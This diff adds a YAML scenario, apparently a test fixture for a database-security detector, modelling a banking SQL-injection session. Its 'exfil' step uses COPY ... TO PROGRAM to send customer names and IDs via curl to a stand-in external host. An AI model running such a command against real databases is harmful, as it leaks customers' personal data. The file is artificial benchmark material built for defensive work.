@@ -1,0 +1,32 @@
+scenario_id: gen_banking_34_sql_injection_ben_867b
+family_id: gen_banking_34_sql_injection_fam_867
+domain: banking
+time_of_day: 09:40
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT customer_id, full_name FROM customers WHERE customer_id = 67123
+  - step_id: exfil
+    sql: COPY (SELECT customer_id, full_name FROM customers WHERE branch_id = 'BR-047')
+      TO PROGRAM 'curl -sX POST https://customs-sync.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 203.0.113.42
+      port: 9443
+matched_pair_id: gen_banking_34_sql_injection_pair_867
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
